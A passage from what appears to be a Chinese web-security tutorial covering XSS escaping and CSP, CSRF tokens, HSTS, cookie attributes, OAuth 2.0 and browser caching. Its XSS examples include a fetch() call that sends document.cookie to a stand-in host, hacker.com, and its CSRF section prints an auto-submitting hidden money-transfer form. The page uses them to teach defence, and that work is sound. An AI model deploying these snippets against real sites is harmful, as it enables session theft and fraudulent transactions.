align="left">innerHTML加载未过滤数据</td></tr></tbody></table><p>危害示例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 窃取Cookie的恶意脚本</span><br>&lt;script&gt;<br>  <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://hacker.com/steal?cookie=&#x27;</span> + <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><strong>核心防御方案</strong></p><p>(1) 内容编码（输出转义）</p><p>原则：所有不可信数据输出前必须转义！</p><p>转义规则：</p><table><thead><tr><th align="left">输出位置</th><th align="left">转义方法</th><th align="left">代码示例（JavaScript）</th></tr></thead><tbody><tr><td align="left">HTML正文</td><td align="left">转义 &lt; &gt; &amp; ‘ “</td><td align="left">const safeStr &#x3D; str.replace(&#x2F;[&amp;&lt;&gt;”‘]&#x2F;g, m &#x3D;&gt; &amp;${htmlEscapes[m]};)</td></tr><tr><td align="left">HTML属性</td><td align="left">转义 “ ‘ 并包裹在引号中</td><td align="left"><code>&lt;div data-value=&quot;$&#123;escapeAttr(value)&#125;&quot;&gt;</code></td></tr><tr><td align="left">JavaScript</td><td align="left">转义 \ ‘ “ &lt; &gt; &amp; + Unicode编码</td><td align="left">const jsSafe &#x3D; JSON.stringify(untrustedData);</td></tr><tr><td align="left">URL参数</td><td align="left">使用encodeURIComponent()</td><td align="left">href&#x3D;”&#x2F;search?q&#x3D;${encodeURIComponent(input)}”</td></tr></tbody></table><p>现代框架自定义转义：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JSX"><span class="hljs-comment">// React自动转义</span><br>&lt;div&gt;&#123;userInput&#125;&lt;/div&gt;<br><br><span class="hljs-comment">// Vue自动转义</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>&#123;&#123; userInput &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>(2) 内容安全策略（CSP）</p><p>原理：通过HTTP头定义可信资源白名单，阻止非法脚本执行。</p><p>关键指令：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Content-Security-Policy</span><span class="hljs-punctuation">: </span><br>  default-src &#x27;self&#x27;;       // 默认仅允许同源<br>  script-src &#x27;self&#x27; https://trusted.cdn.com;  // 脚本来源<br>  style-src &#x27;self&#x27; &#x27;nonce-abc123&#x27;;  // 样式来源<br>  img-src *;                // 图片允许任意源<br>  connect-src https://api.example.com;  // 限制AJAX请求<br>  frame-ancestors &#x27;none&#x27;;   // 禁止嵌套<br>  report-uri /csp-report;   // 违规上报<br></code></pre></td></tr></table></figure><p>安全增强策略：</p><table><thead><tr><th align="left">策略</th><th align="left">作用</th><th align="left">示例指令</th></tr></thead><tbody><tr><td align="left">Nonce机制</td><td align="left">仅允许带特定随机数的脚本执行</td><td align="left">script-src ‘nonce-abc123’</td></tr><tr><td align="left">Hash白名单</td><td align="left">仅允许匹配哈希值的脚本</td><td align="left">script-src ‘sha256-xxxxx’</td></tr><tr><td align="left">严格动态</td><td align="left">禁止动态创建脚本（eval()&#x2F;setTimeout）</td><td align="left">‘strict-dynamic’</td></tr></tbody></table><p><strong>防御体系分层设计</strong></p><table><thead><tr><th align="left">层级</th><th align="left">防御措施</th><th align="left">有效性</th></tr></thead><tbody><tr><td align="left">输入层</td><td align="left">输入验证 + 过滤</td><td align="left">★★☆</td></tr><tr><td align="left">输出层</td><td align="left">内容编码（核心防线）</td><td align="left">★★★</td></tr><tr><td align="left">传输层</td><td align="left">HTTPS防止窃听</td><td align="left">★★☆</td></tr><tr><td align="left">协议层</td><td align="left">CSP（终极防护）</td><td align="left">★★★</td></tr><tr><td align="left">后置防护</td><td align="left">Cookie设置HttpOnly</td><td align="left">★★☆</td></tr></tbody></table><p><strong>实战代码示例</strong></p><p>(1) HTML 代码转义</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">escapeHTML</span>(<span class="hljs-params">str</span>) &#123;<br>  <span class="hljs-keyword">const</span> map = &#123; <br>    <span class="hljs-string">&#x27;&amp;&#x27;</span>: <span class="hljs-string">&#x27;&amp;amp;&#x27;</span>, <br>    <span class="hljs-string">&#x27;&lt;&#x27;</span>: <span class="hljs-string">&#x27;&amp;lt;&#x27;</span>, <br>    <span class="hljs-string">&#x27;&gt;&#x27;</span>: <span class="hljs-string">&#x27;&amp;gt;&#x27;</span>,<br>    <span class="hljs-string">&#x27;&quot;&#x27;</span>: <span class="hljs-string">&#x27;&amp;quot;&#x27;</span>, <br>    <span class="hljs-string">&quot;&#x27;&quot;</span>: <span class="hljs-string">&#x27;&amp;#39;&#x27;</span> <br>  &#125;;<br>  <span class="hljs-keyword">return</span> str.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/[&amp;&lt;&gt;&quot;&#x27;]/g</span>, <span class="hljs-function"><span class="hljs-params">m</span> =&gt;</span> map[m]);<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) CSP 配置（Nginx）</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">add_header</span> Content-Security-Policy <span class="hljs-string">&quot;default-src &#x27;self&#x27;; </span><br><span class="hljs-string">  script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; https:; </span><br><span class="hljs-string">  img-src * data:; </span><br><span class="hljs-string">  style-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;; </span><br><span class="hljs-string">  frame-ancestors &#x27;none&#x27;;&quot;</span>;<br></code></pre></td></tr></table></figure><h3 id="CSRF（跨站请求伪造）与Token验证"><a href="#CSRF（跨站请求伪造）与Token验证" class="headerlink" title="CSRF（跨站请求伪造）与Token验证"></a>CSRF（跨站请求伪造）与Token验证</h3><p><strong>CSRF 攻击原理</strong></p><p>定义：攻击者诱导用户在已登录状态下访问恶意页面，该页面伪造合法请求（如转账&#x2F;改密），利用浏览器的自动Cookie发送机制完成非授权操作。</p><p>攻击流程：</p><pre class="mermaid">sequenceDiagram    participant 用户    participant 银行网站    participant 恶意网站    用户->>银行网站: 正常登录（获得Session Cookie）    用户->>恶意网站: 访问钓鱼页面    恶意网站->>银行网站: 自动发送伪造请求（携带用户Cookie）    银行网站->>恶意网站: 执行操作（误认用户身份）</pre><p>攻击条件：</p><ol><li>用户已登录目标网站</li><li>网站依赖Cookie验证身份</li><li>用户主动访问恶意页面（含自动提交表单&#x2F;脚本）</li></ol><p>伪造请求示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- 钓鱼页面隐藏表单 --&gt;<br>&lt;body onload=&quot;document.forms[0].submit()&quot;&gt;<br>  &lt;form action=&quot;https://bank.com/transfer&quot; method=&quot;POST&quot;&gt;<br>    &lt;input type=&quot;hidden&quot; name=&quot;amount&quot; value=&quot;10000&quot;&gt;<br>    &lt;input type=&quot;hidden&quot; name=&quot;to&quot; value=&quot;hacker_account&quot;&gt;<br>  &lt;/form&gt;<br>&lt;/body&gt;<br></code></pre></td></tr></table></figure><p><strong>Token验证防御机制</strong></p><p>核心原理：在请求中嵌入服务端生成的随机Token，验证请求是否来自真实页面（恶意网站无法获取Token）。</p><p>token 实现流程：</p><pre class="mermaid">sequenceDiagram    participant 用户    participant 前端    participant 后端    用户->>前端: 访问页面    前端->>后端: 请求页面    后端-->>前端: 返回HTML + CSRF Token（存入Session）    前端->>后端: 提交表单（携带Token）    后端->>后端: 验证Token匹配 -> 执行操作</pre><p>token 生成与存储：</p><table><thead><tr><th align="left">位置</th><th align="left">生成方式</th><th align="left">存储位置</th></tr></thead><tbody><tr><td align="left">服务端</td><td align="left">加密随机字符串（如crypto.randomBytes(32)）</td><td align="left">Session&#x2F;Redis</td></tr><tr><td align="left">前端</td><td align="left">插入表单&#x2F;请求头</td><td align="left">表单隐藏域&#x2F;HTTP头</td></tr></tbody></table><p>前端集成示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- 表单内嵌Token --&gt;<br>&lt;form action=&quot;/transfer&quot; method=&quot;POST&quot;&gt;<br>  &lt;input type=&quot;hidden&quot; name=&quot;_csrf&quot; value=&quot;token_value&quot;&gt; <br>  &lt;!-- 其他字段 --&gt;<br>&lt;/form&gt;<br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&lt;!-- <span class="hljs-variable constant_">AJAX</span>请求携带<span class="hljs-title class_">Token</span> --&gt;<br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/action&#x27;</span>, &#123;<br>  <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>  <span class="hljs-attr">headers</span>: &#123;<br>    <span class="hljs-string">&#x27;X-CSRF-Token&#x27;</span>: <span class="hljs-string">&#x27;token_value&#x27;</span>  <span class="hljs-comment">// 自定义请求头</span><br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>服务端验证逻辑：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">verifyCsrfToken</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  <span class="hljs-keyword">const</span> clientToken = req.<span class="hljs-property">body</span>.<span class="hljs-property">_csrf</span> || req.<span class="hljs-property">headers</span>[<span class="hljs-string">&#x27;x-csrf-token&#x27;</span>];<br>  <span class="hljs-keyword">const</span> serverToken = req.<span class="hljs-property">session</span>.<span class="hljs-property">csrfToken</span>; <span class="hljs-comment">// 从Session读取</span><br>  <br>  <span class="hljs-keyword">if</span> (!clientToken || clientToken !== serverToken) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;CSRF Token验证失败&#x27;</span>);<br>  &#125;<br>  <span class="hljs-title function_">next</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>防御体系分层加固</strong></p><table><thead><tr><th align="left">防御层</th><th align="left">措施</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">Token验证</td><td align="left">同步器Token模式</td><td align="left">核心防御（阻断伪造请求）</td></tr><tr><td align="left">Cookie策略</td><td align="left">SameSite&#x3D;Strict&#x2F;Lax</td><td align="left">阻止第三方发送Cookie</td></tr><tr><td align="left">操作验证</td><td align="left">敏感操作需二次确认（密码&#x2F;OTP）</td><td align="left">增加攻击门槛</td></tr><tr><td align="left">Referer检查</td><td align="left">验证请求来源域名</td><td align="left">辅助防御（可被绕过）</td></tr></tbody></table><p>SameSite Cookie 示例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 登录响应设置Cookie</span><br>res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">&#x27;sessionID&#x27;</span>, <span class="hljs-string">&#x27;abc123&#x27;</span>, &#123;<br>  <span class="hljs-attr">httpOnly</span>: <span class="hljs-literal">true</span>,<br>  <span class="hljs-attr">sameSite</span>: <span class="hljs-string">&#x27;strict&#x27;</span>,  <span class="hljs-comment">// 完全禁止第三方发送</span><br>  <span class="hljs-attr">secure</span>: <span class="hljs-literal">true</span>         <span class="hljs-comment">// 仅HTTPS传输</span><br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>Token 设计最佳实践</strong></p><ul><li>单次有效性：每次提交后刷新Token（防重放攻击）</li><li>绑定用户：Token关联用户ID（防不同用户间复用）</li><li>短时效性：设置Token有效期（如10分钟）</li><li>双重验证：关键操作组合Token + 生物认证</li></ul><p><strong>攻击场景对比</strong></p><table><thead><tr><th align="left">特性</th><th align="left">CSRF</th><th align="left">XSS</th></tr></thead><tbody><tr><td align="left">攻击目标</td><td align="left">利用用户身份执行操作</td><td align="left">窃取用户数据</td></tr><tr><td align="left">依赖条件</td><td align="left">用户登录状态 + 访问恶意页面</td><td align="left">网站存在注入漏洞</td></tr><tr><td align="left">防御核心</td><td align="left">Token验证 + SameSite Cookie</td><td align="left">输入输出过滤 + CSP</td></tr></tbody></table><h3 id="HTTPS混合内容风险与HSTS策略"><a href="#HTTPS混合内容风险与HSTS策略" class="headerlink" title="HTTPS混合内容风险与HSTS策略"></a>HTTPS混合内容风险与HSTS策略</h3><p><strong>混合内容风险</strong></p><p>定义：HTTPS页面中加载了通过HTTP协议传输的子资源（如图片&#x2F;脚本&#x2F;样式），导致页面安全等级被破坏。</p><p>攻击原理：</p><pre class="mermaid">sequenceDiagram    participant 用户    participant HTTPS网站    participant 攻击者    participant HTTP资源服务器    用户->>HTTPS网站: 访问https://example.com    HTTPS网站->>用户: 返回加密HTML    用户->>HTTP资源服务器: 请求http://cdn.com/script.js（未加密）    攻击者->>用户: 中间人劫持HTTP流量 -> 注入恶意脚本    用户->>HTTPS网站: 执行被篡改脚本 -> 数据泄露</pre><p>风险等级：</p><table><thead><tr><th align="left">类型</th><th align="left">危险度</th><th align="left">案例</th><th align="left">浏览器表现</th></tr></thead><tbody><tr><td align="left">主动混合内容</td><td align="left">★★★</td><td align="left"><code>&lt;script&gt;/&lt;iframe&gt;</code></td><td align="left">默认拦截</td></tr><tr><td align="left">被动混合内容</td><td align="left">★★☆</td><td align="left"><code>&lt;img&gt;/&lt;audio&gt;</code></td><td align="left">加载但显示”不安全”警告</td></tr></tbody></table><p><strong>HSTS（HTTP严格传输安全）策略</strong></p><p>核心目标：强制浏览器始终通过HTTPS访问网站，消除HTTP降级攻击风险。</p><p>HSTS 工作原理：</p><pre class="mermaid">sequenceDiagram    participant 浏览器    participant 网站服务器    浏览器->>网站服务器: 首次访问 https://example.com    网站服务器->>浏览器: 响应头: Strict-Transport-Security: max-age=31536000    Note right of 浏览器: 本地HSTS缓存生效    浏览器->>网站服务器: 后续所有请求自动HTTPS（即使输入http://）</pre><p>关键响应头指令：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Strict-Transport-Security</span><span class="hljs-punctuation">: </span><br>  max-age=31536000;           // 有效期1年（秒）<br>  includeSubDomains;          // 保护所有子域名<br>  preload                    // 申请加入浏览器预加载列表<br></code></pre></td></tr></table></figure><p>防御效果对比:</p><table><thead><tr><th align="left">攻击类型</th><th align="left">无防护</th><th align="left">HSTS启用后</th></tr></thead><tbody><tr><td align="left">SSL剥离攻击</td><td align="left">❌ 可能降级到HTTP</td><td align="left">✔️ 强制HTTPS连接</td></tr><tr><td align="left">混合内容注入</td><td align="left">❌ 可劫持HTTP资源</td><td align="left">✔️ 自动升级资源请求</td></tr><tr><td align="left">Cookie劫持</td><td align="left">❌ 明文传输Cookie</td><td align="left">✔️ 全程加密</td></tr></tbody></table><p><strong>关键注意事项</strong></p><ul><li>回退风险：<ul><li>启用HSTS后若关闭HTTPS → 用户无法访问网站（直到max-age过期）</li><li>解决方案：部署时先设置较短max-age（如1小时）</li></ul></li><li>首次访问漏洞：<ul><li>用户首次访问<code>http://</code>时仍可能被劫持</li><li>终极方案：申请浏览器HSTS预加载列表（Chrome&#x2F;Firefox内置）</li></ul></li><li>测试环境规避:</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># 开发环境禁用HSTS</span><br><span class="hljs-attribute">add_header</span> Strict-Transport-Security <span class="hljs-string">&quot;max-age=0;&quot;</span>;<br></code></pre></td></tr></table></figure><p><strong>完整安全配置示例</strong></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>  <span class="hljs-attribute">listen</span> <span class="hljs-number">443</span> ssl;<br>  <span class="hljs-attribute">server_name</span> example.com;<br><br>  <span class="hljs-comment"># TLS配置</span><br>  <span class="hljs-attribute">ssl_certificate</span> /path/to/cert.pem;<br>  <span class="hljs-attribute">ssl_certificate_key</span> /path/to/key.pem;<br>  <span class="hljs-attribute">ssl_protocols</span> TLSv1.<span class="hljs-number">2</span> TLSv1.<span class="hljs-number">3</span>;<br><br>  <span class="hljs-comment"># HSTS配置（生产环境）</span><br>  <span class="hljs-attribute">add_header</span> Strict-Transport-Security <span class="hljs-string">&quot;max-age=31536000; includeSubDomains; preload&quot;</span>;<br><br>  <span class="hljs-comment"># 混合内容升级</span><br>  <span class="hljs-attribute">add_header</span> Content-Security-Policy <span class="hljs-string">&quot;upgrade-insecure-requests&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>upgrade-insecure-requests：自动将HTTP资源升级为HTTPS请求</p></blockquote><h2 id="3-2-安全实践"><a href="#3-2-安全实践" class="headerlink" title="3.2 安全实践"></a>3.2 安全实践</h2><h3 id="Cookie-安全属性（Secure-HttpOnly-SameSite）"><a href="#Cookie-安全属性（Secure-HttpOnly-SameSite）" class="headerlink" title="Cookie 安全属性（Secure&#x2F;HttpOnly&#x2F;SameSite）"></a>Cookie 安全属性（Secure&#x2F;HttpOnly&#x2F;SameSite）</h3><p><strong>Secure 属性</strong></p><p>作用：确保Cookie仅通过HTTPS加密连接传输，防止中间人窃听。</p><p>配置方式：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Set-Cookie</span><span class="hljs-punctuation">: </span>sessionId=abc123; Secure;  <br></code></pre></td></tr></table></figure><p>安全影响：</p><table><thead><tr><th align="left">场景</th><th align="left">无Secure</th><th align="left">启用Secure</th></tr></thead><tbody><tr><td align="left">HTTP明文请求</td><td align="left">Cookie明文传输 ❌</td><td align="left">不发送Cookie ✔️</td></tr><tr><td align="left">HTTPS加密请求</td><td align="left">正常发送 ✔️</td><td align="left">正常发送 ✔️</td></tr></tbody></table><blockquote><p>必须项：任何包含敏感信息（如会话ID）的Cookie必须设置Secure。</p></blockquote><p><strong>HttpOnly 属性</strong></p><p>作用：阻止JavaScript通过document.cookie访问Cookie，防范XSS攻击窃取。</p><p>配置方式：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Set-Cookie</span><span class="hljs-punctuation">: </span>sessionId=abc123; HttpOnly;  <br></code></pre></td></tr></table></figure><p>安全影响：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 恶意脚本尝试窃取Cookie</span><br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://hacker.com?cookie=&#x27;</span> + <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>); <br><br><span class="hljs-comment">// 结果：</span><br><span class="hljs-comment">//   ❌ 无HttpOnly：成功窃取会话ID</span><br><span class="hljs-comment">//   ✔️ 有HttpOnly：document.cookie无法读取该Cookie</span><br></code></pre></td></tr></table></figure><blockquote><p>最佳实践：身份验证类Cookie必须启用HttpOnly。</p></blockquote><p><strong>SameSite 属性</strong></p><p>作用：控制Cookie在跨站请求中是否发送，防御CSRF攻击。</p><p>配置值：</p><table><thead><tr><th align="left">属性值</th><th align="left">跨站请求发送规则</th><th align="left">适用场景</th></tr></thead><tbody><tr><td align="left">Strict</td><td align="left">完全禁止跨站发送</td><td align="left">银行操作等高敏感场景</td></tr><tr><td align="left">Lax</td><td align="left">仅允许导航跳转（<code>&lt;a&gt;</code>链接）</td><td align="left">默认推荐值</td></tr><tr><td align="left">None</td><td align="left">允许跨站发送（需同时设置Secure）</td><td align="left">跨域单点登录(SSO)</td></tr></tbody></table><p>配置方式：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Set-Cookie</span><span class="hljs-punctuation">: </span>sessionId=abc123; SameSite=Lax;  <br></code></pre></td></tr></table></figure><p>跨站请求场景对比：</p><table><thead><tr><th align="left">请求类型</th><th align="left">SameSite&#x3D;Strict</th><th align="left">SameSite&#x3D;Lax</th><th align="left">SameSite&#x3D;None</th></tr></thead><tbody><tr><td align="left">直接地址栏输入</td><td align="left">✔️</td><td align="left">✔️</td><td align="left">✔️</td></tr><tr><td align="left"><code>&lt;a href&gt;</code>跳转</td><td align="left">❌</td><td align="left">✔️</td><td align="left">✔️</td></tr><tr><td align="left"><code>&lt;form&gt;</code>表单提交</td><td align="left">❌</td><td align="left">❌</td><td align="left">✔️</td></tr><tr><td align="left">AJAX跨域请求</td><td align="left">❌</td><td align="left">❌</td><td align="left">✔️</td></tr></tbody></table><p><strong>综合防御配置示例</strong></p><p>(1) 安全会话 Cookie 设置</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Set-Cookie</span><span class="hljs-punctuation">: </span><br>  sessionId=abc123; <br>  Secure;          // 仅HTTPS传输<br>  HttpOnly;        // 阻止JS访问<br>  SameSite=Lax;    // 防御CSRF<br>  Path=/;          // 作用路径<br>  Max-Age=3600;    // 有效期（秒）<br></code></pre></td></tr></table></figure><p>(2) 跨域认证 Cookie（OAuth）</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Set-Cookie</span><span class="hljs-punctuation">: </span><br>  oauth_token=xyz789; <br>  Secure; <br>  HttpOnly; <br>  SameSite=None;   // 允许跨站发送<br></code></pre></td></tr></table></figure><h3 id="OAuth-2-0授权流程"><a href="#OAuth-2-0授权流程" class="headerlink" title="OAuth 2.0授权流程"></a>OAuth 2.0授权流程</h3><pre class="mermaid">sequenceDiagram    participant User as 资源所有者 (用户)    participant Client as 客户端 (第三方应用)    participant AuthServer as 授权服务器 (如Google/Facebook)    participant ResourceServer as 资源服务器 (API服务)    Note over User,Client: 前置条件：客户端已在授权服务器注册<br>获得client_id和client_secret    User->>Client: 1. 点击"使用XX账号登录"    Client->>AuthServer: 2. 重定向到授权端点<br>?response_type=code<br>&client_id=CLIENT_ID<br>&redirect_uri=CALLBACK_URL<br>&scope=email profile<br>&state=RANDOM_STRING    AuthServer->>User: 3. 显示登录/授权页面    User->>AuthServer: 4. 输入凭证并授权    AuthServer->>Client: 5. 重定向到callback_uri<br>?code=AUTHORIZATION_CODE<br>&state=RANDOM_STRING    Client->>AuthServer: 6. POST令牌请求<br>grant_type=authorization_code<br>&code=AUTHORIZATION_CODE<br>&redirect_uri=CALLBACK_URL<br>&client_id=CLIENT_ID<br>&client_secret=CLIENT_SECRET    AuthServer->>Client: 7. 返回访问令牌<br>{access_token: "xxx",<br>token_type: "bearer",<br>expires_in: 3600,<br>refresh_token: "yyy"}    Client->>ResourceServer: 8. 携带令牌请求资源<br>Authorization: Bearer xxx    ResourceServer->>Client: 9. 返回受保护资源</pre><h1 id="四、性能优化"><a href="#四、性能优化" class="headerlink" title="四、性能优化"></a>四、性能优化</h1><h2 id="4-1-缓存策略"><a href="#4-1-缓存策略" class="headerlink" title="4.1 缓存策略"></a>4.1 缓存策略</h2><h3 id="强缓存（Cache-Control-Expires）与协商缓存（ETag-Last-Modified）"><a href="#强缓存（Cache-Control-Expires）与协商缓存（ETag-Last-Modified）" class="headerlink" title="强缓存（Cache-Control&#x2F;Expires）与协商缓存（ETag&#x2F;Last-Modified）"></a>强缓存（Cache-Control&#x2F;Expires）与协商缓存（ETag&#x2F;Last-Modified）</h3><p><strong>强缓存（本地缓存）</strong></p><p>浏览器不向服务器发送请求，直接使用本地缓存资源。</p><p>核心响应头：</p><table><thead><tr><th align="left">响应头</th><th align="left">优先级</th><th align="left">值格式</th><th align="left">示例</th><th align="left">特性说明</th></tr></thead><tbody><tr><td align="left">Cache-Control</td><td align="left">高</td><td align="left">指令组合</td><td align="left">max-age&#x3D;3600, public</td><td align="left">HTTP&#x2F;1.1标准，精确控制缓存</td></tr><tr><td align="left">Expires</td><td align="left">低</td><td align="left">GMT时间戳</td><td align="left">Expires: Wed, 21 Oct 2025 07:28:00 GMT</td><td align="left">HTTP&#x2F;1.0遗留，存在时区问题</td></tr></tbody></table><p>常见指令：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span><br>  max-age=3600,          // 缓存有效期（秒）<br>  public,               // 允许代理/CDN缓存<br>  immutable,            // 资源永不更新（适用于版本化文件）<br>  no-store,             // 禁止缓存（最高优先级）<br>  no-cache              // 需协商验证（非字面意思）<br></code></pre></td></tr></table></figure><p>工作流程：</p><pre class="mermaid">graph LR  A[浏览器请求资源] --> B{本地缓存是否有效?}  B -->|Cache-Control有效| C[直接使用缓存]  B -->|缓存失效| D[发起网络请求]</pre><p><strong>协商缓存（条件请求）</strong></p><p>浏览器携带验证信息请求服务器，由服务器决定是否返回资源（304复用缓存）。</p><p>核心头对：</p><table><thead><tr><th align="left">响应头</th><th align="left">请求头</th><th align="left">验证原理</th><th align="left">优先级</th></tr></thead><tbody><tr><td align="left">ETag</td><td align="left">If-None-Match</td><td align="left">资源内容哈希值（如”d53jk-“）</td><td align="left">高</td></tr><tr><td align="left">Last-Modified</td><td align="left">If-Modified-Since</td><td align="left">最后修改时间戳</td><td align="left">低</td></tr></tbody></table><p>工作流程：</p><pre class="mermaid">sequenceDiagram    participant Browser    participant Server    Browser->>Server: 首次请求 /style.css    Server->>Browser: 返回资源 + ETag: W/"d53jk-"    Browser->>Server: 二次请求（携带 If-None-Match: W/"d53jk-"）    alt 资源未修改        Server->>Browser: 304 Not Modified（空body）        Browser->>Browser: 使用缓存    else 资源已更新        Server->>Browser: 200 OK + 新资源    end</pre><p><strong>对比与选型指南</strong></p><table><thead><tr><th align="left">特性</th><th align="left">强缓存</th><th align="left">协商缓存</th></tr></thead><tbody><tr><td align="left">网络请求</td><td align="left">无请求</td><td align="left">有请求（304响应）</td></tr><tr><td align="left">带宽消耗</td><td align="left">0</td><td align="left">小（仅头部传输）</td></tr><tr><td align="left">更新灵敏度</td><td align="left">依赖max-age设置</td><td align="left">即时更新</td></tr><tr><td align="left">适用资源</td><td align="left">静态资源（JS&#x2F;CSS&#x2F;图片版本化）</td><td align="left">动态内容（个性化API数据）</td></tr><tr><td align="left">典型配置</td><td align="left">Cache-Control: max-age&#x3D;31536000, immutable</td><td align="left">Cache-Control: no-cache + ETag</td></tr></tbody></table><p><strong>最佳实践配置</strong></p><p>(1) 静态资源（强缓存）</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> /static/ &#123;<br>  <span class="hljs-attribute">add_header</span> Cache-Control <span class="hljs-string">&quot;public, 